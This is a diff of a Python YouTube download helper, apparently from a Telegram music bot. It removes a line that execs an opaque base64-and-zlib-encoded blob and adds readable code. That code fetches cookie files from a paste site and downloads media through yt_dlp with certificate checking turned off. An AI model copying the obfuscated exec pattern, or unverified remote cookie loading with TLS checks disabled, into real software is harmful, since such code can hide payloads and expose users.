@@ -1,2 +1,153 @@
-#ALONE-CODER
-import zlib, base64; exec(zlib.decompress(base64.b64decode("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")).decode("utf-8"))
+
+
+import os
+import re
+import yt_dlp
+import random
+import asyncio
+import aiohttp
+from pathlib import Path
+
+from py_yt import Playlist, VideosSearch
+
+from AloneX import logger
+from AloneX.helpers import Track, utils
+
+
+class YouTube:
+    def __init__(self):
+        self.base = "https://www.youtube.com/watch?v="
+        self.cookies = []
+        self.checked = False
+        self.cookie_dir = "AloneX/cookies"
+        self.warned = False
+        self.regex = re.compile(
+            r"(https?://)?(www\.|m\.|music\.)?"
+            r"(youtube\.com/(watch\?v=|shorts/|playlist\?list=)|youtu\.be/)"
+            r"([A-Za-z0-9_-]{11}|PL[A-Za-z0-9_-]+)([&?][^\s]*)?"
+        )
+        self.iregex = re.compile(
+            r"https?://(?:www\.|m\.|music\.)?(?:youtube\.com|youtu\.be)"
+            r"(?!/(watch\?v=[A-Za-z0-9_-]{11}|shorts/[A-Za-z0-9_-]{11}"
+            r"|playlist\?list=PL[A-Za-z0-9_-]+|[A-Za-z0-9_-]{11}))\S*"
+        )
+
+    def get_cookies(self):
+        if not self.checked:
+            for file in os.listdir(self.cookie_dir):
+                if file.endswith(".txt"):
+                    self.cookies.append(f"{self.cookie_dir}/{file}")
+            self.checked = True
+        if not self.cookies:
+            if not self.warned:
+                self.warned = True
+                logger.warning("Cookies are missing; downloads might fail.")
+            return None
+        return random.choice(self.cookies)
+
+    async def save_cookies(self, urls: list[str]) -> None:
+        logger.info("Saving cookies from urls...")
+        async with aiohttp.ClientSession() as session:
+            for url in urls:
+                name = url.split("/")[-1]
+                link = "https://batbin.me/raw/" + name
+                async with session.get(link) as resp:
+                    resp.raise_for_status()
+                    with open(f"{self.cookie_dir}/{name}.txt", "wb") as fw:
+                        fw.write(await resp.read())
+        logger.info(f"Cookies saved in {self.cookie_dir}.")
+
+    def valid(self, url: str) -> bool:
+        return bool(re.match(self.regex, url))
+
+    def invalid(self, url: str) -> bool:
+        return bool(re.match(self.iregex, url))
+
+    async def search(self, query: str, m_id: int, video: bool = False) -> Track | None:
+        try:
+            _search = VideosSearch(query, limit=1, with_live=False)
+            results = await _search.next()
+        except Exception:
+            return None
+        if results and results["result"]:
+            data = results["result"][0]
+            return Track(
+                id=data.get("id"),
+                channel_name=data.get("channel", {}).get("name"),
+                duration=data.get("duration"),
+                duration_sec=utils.to_seconds(data.get("duration")),
+                message_id=m_id,
+                title=data.get("title")[:25],
+                thumbnail=data.get("thumbnails", [{}])[-1].get("url").split("?")[0],
+                url=data.get("link"),
+                view_count=data.get("viewCount", {}).get("short"),
+                video=video,
+            )
+        return None
+
+    async def playlist(self, limit: int, user: str, url: str, video: bool) -> list[Track | None]:
+        tracks = []
+        try:
+            plist = await Playlist.get(url)
+            for data in plist["videos"][:limit]:
+                track = Track(
+                    id=data.get("id"),
+                    channel_name=data.get("channel", {}).get("name", ""),
+                    duration=data.get("duration"),
+                    duration_sec=utils.to_seconds(data.get("duration")),
+                    title=data.get("title")[:25],
+                    thumbnail=data.get("thumbnails")[-1].get("url").split("?")[0],
+                    url=data.get("link").split("&list=")[0],
+                    user=user,
+                    view_count="",
+                    video=video,
+                )
+                tracks.append(track)
+        except Exception:
+            pass
+        return tracks
+
+    async def download(self, video_id: str, video: bool = False) -> str | None:
+        url = self.base + video_id
+        ext = "mp4" if video else "webm"
+        filename = f"downloads/{video_id}.{ext}"
+
+        if Path(filename).exists():
+            return filename
+
+        cookie = self.get_cookies()
+        base_opts = {
+            "outtmpl": "downloads/%(id)s.%(ext)s",
+            "quiet": True,
+            "noplaylist": True,
+            "geo_bypass": True,
+            "no_warnings": True,
+            "overwrites": False,
+            "nocheckcertificate": True,
+            "cookiefile": cookie,
+        }
+
+        if video:
+            ydl_opts = {
+                **base_opts,
+                "format": "(bestvideo[height<=?720][width<=?1280][ext=mp4])+(bestaudio)",
+                "merge_output_format": "mp4",
+            }
+        else:
+            ydl_opts = {
+                **base_opts,
+                "format": "bestaudio[ext=webm][acodec=opus]",
+            }
+
+        def _download():
+            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+                try:
+                    ydl.download([url])
+                except (yt_dlp.utils.DownloadError, yt_dlp.utils.ExtractorError):
+                    return None
+                except Exception as ex:
+                    logger.warning("Download failed: %s", ex)
+                    return None
+            return filename
+
+        return await asyncio.to_thread(_download)
